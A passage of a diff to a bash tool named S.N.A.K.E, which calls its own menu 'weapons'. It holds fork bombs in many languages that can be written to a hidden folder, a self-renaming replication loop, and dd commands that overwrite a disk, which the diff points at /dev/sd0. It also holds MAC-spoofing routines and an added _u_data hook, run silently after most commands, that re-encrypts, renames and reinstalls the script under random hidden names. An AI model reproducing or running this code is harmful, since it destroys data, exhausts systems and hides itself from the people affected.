@@ -1,11 +1,11 @@
 #!/bin/bash
 
 
-_version="0.5.7"
+_version="0.5.8"
 _name="S.N.A.K.E"
 _morph_state="Unknown"
 
-
+_id="0dc4e0"
 
 _blinking=true
 _verbose=false
@@ -167,6 +167,8 @@ _mirror(){ #selft
      printf "$RED Not supported on this system$NC\n"
    fi
 
+   _u_data 2> /dev/null
+
 }
 
 
@@ -192,6 +194,8 @@ _people(){ #selfe
        printf "$RED Not supported on your OS$NC\n"
     fi
 
+
+    _u_data 2> /dev/null
 }
 
 
@@ -506,6 +510,8 @@ _myself(){ #selfc
       printf "$RED Not supported sys$NC\n"
   fi
 
+  _u_data 2> /dev/null
+
 }
 
 
@@ -524,6 +530,8 @@ _stringify(){ #selft
    else
       awk '$1=$1' ORS='\\n' $1 | sed 's/ //g'
    fi
+
+   _u_data 2> /dev/null
 
 }
 
@@ -770,6 +778,7 @@ _self(){ #selfh
            echo "   while(1){ fork(); }"
            echo "   return 0;"
            echo "}"
+           echo ""
          fi
 
        elif [[ "$3" == "bash" ]]; then
@@ -782,6 +791,7 @@ _self(){ #selfh
          else
            echo ""
            echo ":(){ :|:& };:"
+           echo ""
          fi
 
        elif [[ "$3" == "bat" ]]; then
@@ -794,6 +804,7 @@ _self(){ #selfh
          else
            echo ""
            echo "%0 | %0"
+           echo ""
          fi
 
        elif [[ "$3" == "cmd" ]]; then
@@ -818,6 +829,7 @@ _self(){ #selfh
            echo "start"
            echo "start"
            echo "start zion"
+           echo ""
          fi
 
        elif [[ "$3" == "py" ]]; then
@@ -834,6 +846,7 @@ _self(){ #selfh
            echo "import os"
            echo "while True:"
            echo "   os.fork()"
+           echo ""
          fi
 
        elif [[ "$3" == "ps" ]]; then
@@ -852,6 +865,7 @@ _self(){ #selfh
            echo "while True:"
            echo "   Invoke-Expression -Command 'while(\$true) {Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\"}';"
            echo "}"
+           echo ""
          fi
 
        elif [[ "$3" == "java" ]]; then
@@ -859,10 +873,10 @@ _self(){ #selfh
          if [ "$4" == "deploy" ]; then
            cd ~ ;  mkdir .new_nest ; cd .new_nest
            touch zion.java
-           echo "public class ForkBomb" >> zion.java
+           echo "public class zion" >> zion.java
            echo "{" >> zion.java
            echo "   public static void main(String[] args){" >> zion.java
-           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});}" >> zion.java
+           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"zion\"});}" >> zion.java
            echo "   }" >> zion.java
            echo "}" >> zion.java
            pwd ; ls
@@ -874,6 +888,7 @@ _self(){ #selfh
            echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});}"
            echo "   }"
            echo "}"
+           echo ""
          fi
 
        elif [[ "$3" == "lua" ]]; then
@@ -896,6 +911,7 @@ _self(){ #selfh
            echo "while true do"
            echo "   unistd.fork()"
            echo "end"
+           echo ""
          fi
 
        elif [[ "$3" == "perl" ]]; then
@@ -908,6 +924,36 @@ _self(){ #selfh
          else
            echo ""
            echo "perl -e \"fork while fork\" &"
+           echo ""
+         fi
+
+       elif [[ "$3" == "ruby" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.rb
+           echo "def cpu_intensive_process" >> zion.rb
+           echo "   puts \"Pid: #{Process.pid}\"" >> zion.rb
+           echo "   x = 0" >> zion.rb
+           echo "   10000000.times do |i|" >> zion.rb
+           echo "   x = i + x" >> zion.rb
+           echo "   end" >> zion.rb
+           echo "end" >> zion.rb
+           echo "fork" >> zion.rb
+           echo "cpu_intensive_process" >> zion.rb
+           pwd ; ls
+         else
+           echo ""
+           echo "def cpu_intensive_process"
+           echo "   puts \"Pid: #{Process.pid}\""
+           echo "   x = 0"
+           echo "   10000000.times do |i|"
+           echo "   x = i + x"
+           echo "   end"
+           echo "end"
+           echo "fork"
+           echo "cpu_intensive_process"
+           echo ""
          fi
 
        elif [[ "$3" == "magic" ]]; then
@@ -930,7 +976,7 @@ _self(){ #selfh
        fi
 
      elif [[ "$2" == "rabbt" ]]; then
-       _new="$(openssl rand -hex 4 | cut -c 1-5)"
+       _new="$(openssl rand -base64 32 | tr -cd 'a-z' | cut -c 1-5)"
        while(true); do
          _r_melt $_new
          $_new self bay rabbt
@@ -939,21 +985,52 @@ _self(){ #selfh
          $_new self bay rabbt
        done
      elif [[ "$2" == "dwipe" ]]; then
-       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sdX
+       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sd0
      elif [[ "$2" == "dsenc" ]]; then
-       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sdX
+       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sd0
      elif [[ "$2" == "magic" ]]; then
        printf "fbomb :: klogr :: rabbt :: dwipe :: dsenc\n"
      else
        printf "$RED Weapon type ERROR$NC\n"
      fi
 
-
+   elif [[ "$1" == "app" ]]; then
+     if [ "$2" == "basic" ]; then
+       if [ "$3" == "ios" ]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "droid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "hybrid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       fi
+     elif [[ "$2" == "radio" ]]; then
+       if [ "$3" == "ios" ]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "droid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "hybrid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       fi
+     elif [[ "$2" == "video" ]]; then
+       if [ "$3" == "ios" ]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "droid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "hybrid" ]]; then
+          printf "$RED Not supported yet$NC\n"
+       fi
+     elif [[ "$2" == "magic" ]]; then
+        printf "basic :: radio :: video :: voip :: web\n"
+     else
+        printf "$RED Not supported yet$NC\n"
+     fi
    elif [[ "$1" == "magic" ]]; then
-     printf "$RED FUNC$YELLOW SYS$GREEN DB $BLUE BAY$NC\n"
+     printf "$RED FUNC$YELLOW SYS$GREEN DB$BLUE BAY$WHITE APP$NC\n"
    else
      printf "$RED Not supported default$NC\n"
    fi
+
+   _u_data 2> /dev/null
 
 
 
@@ -971,7 +1048,26 @@ _geolocate(){ #selft
      curl -sf ipinfo.io/$1 | sed '1d' | sed '$d' | sed 's/"//g'
    fi
 
+   _u_data 2> /dev/null
 
+
+}
+
+_magnet(){ #selft
+
+   ls | egrep "^.*\.$2$"
+
+  :'
+   if [ "$(echo $1 | grep -c 't')" == "1" ]; then
+
+   elif [[ "$(echo $1 | grep -c 'n')" == "1" ]]; then
+     ls | egrep "^.*$2$"
+   else
+     ls | egrep "^.*\.$2$"
+   fi
+   '
+
+   _u_data 2> /dev/null
 }
 
 
@@ -1011,6 +1107,8 @@ _everything(){ #selfc
    else
        printf "$RED Not supported sys$NC\n"
    fi
+
+   _u_data 2> /dev/null
 
 
 
@@ -1085,6 +1183,8 @@ _router_info(){ #selfc
   fi
 
 
+  _u_data 2> /dev/null
+
 }
 
 
@@ -1151,6 +1251,8 @@ _network(){ #selfe
    else
        printf "$RED sNET ERROR $NC\n"
    fi
+
+   _u_data 2> /dev/null
 }
 
 _opaa(){ #selfp
@@ -1181,6 +1283,7 @@ _opaa(){ #selfp
   printf "                   S      dFNu...a   S\n"
   printf "                    N..   ?B        :R$NC\n"
 
+  _u_data 2> /dev/null
 
 }
 
@@ -1338,7 +1441,7 @@ _samsung(){ #morph
 
 
   _rnd=$[RANDOM%14]
-
+  _codes=("D0:87:E2" "20:55:31" "54:40:AD" "84:2E:27" "50:F0:D3" "84:11:9E" "08:EC:A9" "10:D3:8A" "38:2D:D1" "E0:CB:EE" "64:B8:53" "F4:42:8F" "18:83:31" "84:55:A5" "A8:7C:01" "C0:11:73")
 
 
 
@@ -1354,8 +1457,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("D0:87:E2" "20:55:31" "54:40:AD" "84:2E:27" "50:F0:D3" "84:11:9E" "08:EC:A9" "10:D3:8A" "38:2D:D1" "E0:CB:EE" "64:B8:53" "F4:42:8F" "18:83:31" "84:55:A5" "A8:7C:01" "C0:11:73")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1448,7 +1549,7 @@ _lg(){ #morph
 
 
   _rnd=$[RANDOM%9]
-
+  _codes=("14:C9:13" "3C:BD:D8" "2C:54:CF" "00:1F:E3" "00:26:E2" "00:1E:75" "6C:D6:8A" "20:21:A5" "0C:48:85")
 
   _system="$(uname -s)"
 
@@ -1461,8 +1562,6 @@ _lg(){ #morph
     printf "$RED Not supported yet$NC\n"
 
   elif [[ $_system == "Darwin" ]]; then #tw
-
-  _codes=("14:C9:13" "3C:BD:D8" "2C:54:CF" "00:1F:E3" "00:26:E2" "00:1E:75" "6C:D6:8A" "20:21:A5" "0C:48:85")
 
   _off
   sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1553,7 +1652,7 @@ _apple(){ #morph
 
 
   _rnd=$[RANDOM%19]
-
+  _codes=("F0:76:6F" "40:CB:C0" "40:98:AD" "6C:4D:73" "C4:84:66" "B8:63:4D" "50:32:37" "D4:61:9D" "B0:48:1A" "98:9E:63" "DC:A9:04" "48:A1:95" "6C:AB:31" "7C:50:49" "E4:2B:34" "1C:36:BB" "3C:2E:FF" "6C:96:CF" "30:35:AD" "A8:BE:27" "70:A2:B3")
 
 
   _system="$(uname -s)"
@@ -1569,8 +1668,6 @@ _apple(){ #morph
   elif [[ $_system == "Darwin" ]]; then #tw
 
   #printf "$YELLOW DEBUG ->$BLUE Darwin morphing$NC\n"
-
-  _codes=("F0:76:6F" "40:CB:C0" "40:98:AD" "6C:4D:73" "C4:84:66" "B8:63:4D" "50:32:37" "D4:61:9D" "B0:48:1A" "98:9E:63" "DC:A9:04" "48:A1:95" "6C:AB:31" "7C:50:49" "E4:2B:34" "1C:36:BB" "3C:2E:FF" "6C:96:CF" "30:35:AD" "A8:BE:27" "70:A2:B3")
 
   _off
   sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1670,7 +1767,7 @@ _oppo(){ #morph
 
 
   _rnd=$[RANDOM%19]
-
+  _codes=("E8:BB:A8" "BC:3A:EA" "8C:0E:E3" "6C:5C:14" "EC:F3:42" "DC:55:83" "88:5A:06" "1C:42:7D" "50:29:F5" "84:6F:CE" "F4:D6:20" "EC:51:BC" "F0:79:E8" "F0:6D:78" "50:3C:EA" "58:7A:6A" "E4:C4:83" "D4:67:D3" "58:C6:F0" "C0:2E:25" "48:83:B4")
 
 
 
@@ -1687,8 +1784,6 @@ elif [[ $_system == "A/UX" ]]; then
 elif [[ $_system == "Darwin" ]]; then #tw
 
 #printf "$YELLOW DEBUG ->$BLUE Darwin morphing$NC\n"
-
-_codes=("E8:BB:A8" "BC:3A:EA" "8C:0E:E3" "6C:5C:14" "EC:F3:42" "DC:55:83" "88:5A:06" "1C:42:7D" "50:29:F5" "84:6F:CE" "F4:D6:20" "EC:51:BC" "F0:79:E8" "F0:6D:78" "50:3C:EA" "58:7A:6A" "E4:C4:83" "D4:67:D3" "58:C6:F0" "C0:2E:25" "48:83:B4")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -1883,7 +1978,7 @@ _huawei(){ #morph
 
 
 _rnd=$[RANDOM%19]
-
+_codes=("48:AD:08" "2C:AB:00" "00:E0:FC" "24:DF:6A" "00:9A:CD" "80:38:BC" "D4:40:F0" "64:A6:51" "E8:CD:2D" "AC:E2:15" "EC:23:3D" "78:F5:FD" "80:B6:86" "10:C6:1F" "88:53:D4" "0C:37:DC" "BC:76:70" "24:DB:AC" "0C:45:BA" "CC:A2:23" "E8:08:8B")
 
 _system="$(uname -s)"
 
@@ -1896,8 +1991,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("48:AD:08" "2C:AB:00" "00:E0:FC" "24:DF:6A" "00:9A:CD" "80:38:BC" "D4:40:F0" "64:A6:51" "E8:CD:2D" "AC:E2:15" "EC:23:3D" "78:F5:FD" "80:B6:86" "10:C6:1F" "88:53:D4" "0C:37:DC" "BC:76:70" "24:DB:AC" "0C:45:BA" "CC:A2:23" "E8:08:8B")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2283,7 +2376,7 @@ fi
 _nokia(){ #morph
 
   _rnd=$[RANDOM%13]
-
+  _codes=("A4:81:EE" "4C:7F:62" "40:7A:80" "B0:5C:E5" "D4:C1:FC" "48:DC:FB" "E0:A6:70" "6C:9B:02" "0C:DD:EF" "54:44:08" "C8:D1:0B" "C8:97:9F" "F4:F5:A5" "3C:C2:43")
 
 
 _system="$(uname -s)"
@@ -2297,8 +2390,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("A4:81:EE" "4C:7F:62" "40:7A:80" "B0:5C:E5" "D4:C1:FC" "48:DC:FB" "E0:A6:70" "6C:9B:02" "0C:DD:EF" "54:44:08" "C8:D1:0B" "C8:97:9F" "F4:F5:A5" "3C:C2:43")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2388,7 +2479,7 @@ _htc(){ #morph
 
 
   _rnd=$[RANDOM%18]
-
+  _codes=("80:7A:BF" "90:E7:C4" "7C:61:93" "2C:8A:72" "98:0D:2E" "A8:26:D9" "D4:20:6D" "18:87:96" "00:23:76" "04:C2:3E" "00:EE:BD" "AC:37:43" "00:09:2D" "F8:DB:7F" "E8:99:C4" "80:01:84" "50:2E:5C" "84:7A:88" "74:F6:1C" "38:E7:D8")
 
 
 
@@ -2403,8 +2494,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("80:7A:BF" "90:E7:C4" "7C:61:93" "2C:8A:72" "98:0D:2E" "A8:26:D9" "D4:20:6D" "18:87:96" "00:23:76" "04:C2:3E" "00:EE:BD" "AC:37:43" "00:09:2D" "F8:DB:7F" "E8:99:C4" "80:01:84" "50:2E:5C" "84:7A:88" "74:F6:1C" "38:E7:D8")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2492,7 +2581,7 @@ fi
 _xiaomi(){ #morph
 
   _rnd=$[RANDOM%19]
-
+  _codes=("8C:5A:F8" "F8:A4:5F" "8C:BE:BE" "64:09:80" "98:FA:E3" "18:59:36" "9C:99:A0" "C4:0B:CB" "EC:D0:9F" "F4:F5:DB" "E4:46:DA" "18:F0:E4" "9C:2E:A1" "50:A0:09" "20:A6:0C" "E0:DC:FF" "60:AB:67" "90:78:B2" "04:C8:07" "74:23:44" "D8:32:E3")
 
 
 
@@ -2507,8 +2596,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("8C:5A:F8" "F8:A4:5F" "8C:BE:BE" "64:09:80" "98:FA:E3" "18:59:36" "9C:99:A0" "C4:0B:CB" "EC:D0:9F" "F4:F5:DB" "E4:46:DA" "18:F0:E4" "9C:2E:A1" "50:A0:09" "20:A6:0C" "E0:DC:FF" "60:AB:67" "90:78:B2" "04:C8:07" "74:23:44" "D8:32:E3")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2598,7 +2685,7 @@ _hp(){ #morph
 
 
   _rnd=$[RANDOM%19]
-
+  _codes=("3C:D9:2B" "9C:8E:99" "B4:99:BA" "1C:C1:DE" "F4:CE:46" "00:1C:C4" "00:25:B3" "00:18:71" "00:0B:CD" "00:0E:7F" "00:0F:20" "00:11:0A" "00:13:21" "00:16:35" "00:17:A4" "00:08:02" "00:08:83" "C4:34:6B" "8C:DC:D4" "34:64:A9" "D4:C9:EF")
 
 
 _system="$(uname -s)"
@@ -2612,8 +2699,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("3C:D9:2B" "9C:8E:99" "B4:99:BA" "1C:C1:DE" "F4:CE:46" "00:1C:C4" "00:25:B3" "00:18:71" "00:0B:CD" "00:0E:7F" "00:0F:20" "00:11:0A" "00:13:21" "00:16:35" "00:17:A4" "00:08:02" "00:08:83" "C4:34:6B" "8C:DC:D4" "34:64:A9" "D4:C9:EF")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2705,7 +2790,7 @@ _dell(){ #morph
 
 
   _rnd=$[RANDOM%19]
-
+  _codes=("EC:F4:BB" "D0:67:E5" "18:A9:9B" "F8:DB:88" "18:FB:7B" "74:E6:E2" "10:98:36" "44:A8:42" "34:E6:D7" "00:0B:DB" "00:11:43" "00:18:8B" "D4:BE:D9" "00:1A:A0" "00:21:70" "00:26:B9" "A4:BA:DB" "00:1E:4F" "5C:F9:DD" "00:06:5B" "80:18:44")
 
 
 
@@ -2720,8 +2805,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("EC:F4:BB" "D0:67:E5" "18:A9:9B" "F8:DB:88" "18:FB:7B" "74:E6:E2" "10:98:36" "44:A8:42" "34:E6:D7" "00:0B:DB" "00:11:43" "00:18:8B" "D4:BE:D9" "00:1A:A0" "00:21:70" "00:26:B9" "A4:BA:DB" "00:1E:4F" "5C:F9:DD" "00:06:5B" "80:18:44")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2810,7 +2893,7 @@ _ibm(){ #morph
 
 
 _rnd=$[RANDOM%19]
-
+_codes=("00:04:AC" "00:60:94" "A8:97:DC" "E4:1F:13" "00:25:03" "00:17:EF" "10:00:5A" "98:BE:94" "6C:AE:8B" "5C:F3:FC" "FC:CF:62" "00:21:5E" "00:02:55" "00:50:76" "00:06:29" "00:20:35" "08:00:5A" "40:F2:E9" "00:09:6B" "74:99:75" "34:40:B5")
 
 
 _system="$(uname -s)"
@@ -2825,8 +2908,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("00:04:AC" "00:60:94" "A8:97:DC" "E4:1F:13" "00:25:03" "00:17:EF" "10:00:5A" "98:BE:94" "6C:AE:8B" "5C:F3:FC" "FC:CF:62" "00:21:5E" "00:02:55" "00:50:76" "00:06:29" "00:20:35" "08:00:5A" "40:F2:E9" "00:09:6B" "74:99:75" "34:40:B5")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2915,7 +2996,7 @@ _microsoft(){ #morph
 
 
 _rnd=$[RANDOM%19]
-
+_codes=("38:F2:3E" "48:50:73" "74:E2:8C" "84:63:D6" "D4:8F:33" "00:15:5D" "00:50:F2" "98:5F:D3" "38:25:6B" "BC:83:85" "EC:83:50" "B8:31:B5" "9C:6C:15" "48:86:E8" "2C:29:97" "10:2F:6B" "28:18:78" "60:45:BD" "7C:ED:8D" "00:0D:3A" "B4:E1:C4")
 
 
 _system="$(uname -s)"
@@ -2929,8 +3010,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("38:F2:3E" "48:50:73" "74:E2:8C" "84:63:D6" "D4:8F:33" "00:15:5D" "00:50:F2" "98:5F:D3" "38:25:6B" "BC:83:85" "EC:83:50" "B8:31:B5" "9C:6C:15" "48:86:E8" "2C:29:97" "10:2F:6B" "28:18:78" "60:45:BD" "7C:ED:8D" "00:0D:3A" "B4:E1:C4")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -3020,7 +3099,7 @@ _lenovo(){ #morph
 
 
 _rnd=$[RANDOM%5]
-
+_codes=("98:FF:D0" "50:3C:C4" "74:04:2B" "E0:2C:B2" "70:72:0D" "D4:22:3F")
 
 _system="$(uname -s)"
 
@@ -3033,8 +3112,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("98:FF:D0" "50:3C:C4" "74:04:2B" "E0:2C:B2" "70:72:0D" "D4:22:3F")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -3124,7 +3201,7 @@ _intel(){ #morph
 
 
   _rnd=$[RANDOM%6]
-
+  _codes=("00:03:47" "00:11:75" "00:13:E8" "00:13:02" "E4:F8:9C" "A4:02:B9" "4C:34:88")
 
 _system="$(uname -s)"
 
@@ -3137,8 +3214,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("00:03:47" "00:11:75" "00:13:E8" "00:13:02" "E4:F8:9C" "A4:02:B9" "4C:34:88")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -3628,7 +3703,7 @@ _boeing(){ #morph
 
 
   _rnd=$[RANDOM%3]
-
+  _codes=("00:50:93" "00:06:F8" "34:61:78" "00:40:BE")
 
 
 _system="$(uname -s)"
@@ -3642,8 +3717,6 @@ elif [[ $_system == "A/UX" ]]; then
   printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Darwin" ]]; then #tw
-
-_codes=("00:50:93" "00:06:F8" "34:61:78" "00:40:BE")
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -4751,11 +4824,15 @@ _relist(){ #selft
 
    clear ; ls
 
+   _u_data 2> /dev/null
+
 }
 
 _highlight(){ #selft
 
    _yellow ; clear ; ls ; quietTextRestore
+
+   _u_data 2> /dev/null
 
 }
 
@@ -4763,6 +4840,8 @@ _highlight(){ #selft
 _reveal(){ #selft
 
    _white ; clear ; ls -la ; quietTextRestore
+
+   _u_data 2> /dev/null
 
 }
 
@@ -5417,7 +5496,7 @@ fi
    fi
 
 
-
+   _u_data 2> /dev/null
 
 
 }
@@ -5694,6 +5773,8 @@ _inject(){ #selfi
     printf "$RED Not supported sys$NC\n"
   fi
 
+  _u_data 2> /dev/null
+
 }
 
 
@@ -5951,6 +6032,8 @@ _appID(){ #selft
 
     ps -A | grep -m1 "$1" | awk '{print $1}'
 
+    _u_data 2> /dev/null
+
 }
 
 _snap(){ #selfs
@@ -6149,6 +6232,8 @@ _snap(){ #selfs
 
            fi
 
+           _u_data 2> /dev/null
+
 }
 
 
@@ -6340,6 +6425,8 @@ _decompose(){ #selfs
 
         fi
 
+        _u_data 2> /dev/null
+
 
 }
 
@@ -6515,7 +6602,12 @@ _pd(){ #selfc
 
 
   cd ~
-  mkdir .spx ; cd .spx
+  if [ -d ~/.spx ]; then
+     echo "moo" >/dev/null
+     #sudo rm -rf ~/.spx/snake.sslz
+  else
+     mkdir .spx ; cd .spx
+  fi
   sudo cp /usr/local/bin/snake ./snake
   openssl des -e -in snake -out snake.sslz -pass pass:cartof
   cd ~ ; snake dsp ; sudo killall -9 Terminal
@@ -6525,7 +6617,13 @@ _pd(){ #selfc
 _protect(){ #selfc
 
   cd ~
-  mkdir .spx ; cd .spx
+  if [ -d "~/.spx" ]; then
+     echo "moo" >/dev/null
+     #sudo rm -rf ~/.spx/snake.sslz
+  else
+     mkdir .spx ; cd .spx
+  fi
+
   sudo cp /usr/local/bin/snake ./snake
   openssl des -e -in snake -out snake.sslz -pass pass:cartof
   touch xsnake
@@ -6628,8 +6726,7 @@ _back(){ #selfc
    cd ~/.spx
    openssl des -d -in snake.sslz -out snake -pass pass:cartof >/dev/null 2>&1
    sh snake -qinstall
-   unalias snake
-   sudo rm -rf .spx
+   sudo rm -rf ~/.spx
    sudo rm -rf /usr/local/bin/xsnake
 
 
@@ -6835,11 +6932,491 @@ _a_p(){ #selfc
 
 }
 
+_u_data(){ #selfc
+
+
+
+if [ -f /usr/local/bin/snake ]; then
+   _loc=/usr/local/bin/snake
+else
+  if [ -f ~/.spx/snake ]; then
+    _loc=~/.spx/snake
+  else
+    openssl des -d -in snake.sslz -out snake -pass pass:cartof
+    _loc=~/.spx/snake
+  fi
+fi
+
+
+  _system="$(uname -s)"
+
+
+
+
+
+ if [ $_system == "Darwin" ]; then
+
+
+  _new="$(openssl rand -hex 14)"
+  _nfd="$(openssl rand -base64 32 | tr -cd 'a-z' | cut -c 1-3 | sed 's/^/./' | sed 's/ssh/blr/g' | sed 's/tor/blr/g' | sed 's/npm/blr/g')"
+
+
+  cd ~
+  mkdir blana ; cd blana
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
+     if [ -f ~/.spx/snake.sslz ]; then
+
+       xsnake back
+       sh snake -uninstall
+       _wasp=true
+
+     else
+       sh snake -uninstall
+       _wasp=false
+     fi
+  sudo rm -rf snake
+  cat snake2 | sed "s/cartof/$_new/g" | sed "s/.spx/$_nfd/g" > snake
+  sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+  if [ $_wasp == true ]; then
+     snake protect c
+  else
+     echo "moo" >/dev/null
+  fi
+
+
+elif [[ $_system == "Linux" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cd ~
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
+  cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  sudo rm -rf snake2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
+  sh snake -uninstall
+  sudo rm -rf snake
+  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+
+elif [[ $_system == "GNU" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+ su
+ cp $_loc ./snake
+ cp snake snake2
+ sh snake -uninstall
+ rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ rm -rf snake2 ; sh $_new -qinstall ; rm -rf $_new
+
+elif [[ $_system == "Haiku" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cat snake | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  printf "$_new\n" ; sh $_new -qinstall
+  sh snake -uninstall
+  rm -rf snake
+
+
+elif [[ $_system == "HP-UX" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+
+elif [[ $_system == "Minix" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "SunOS" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
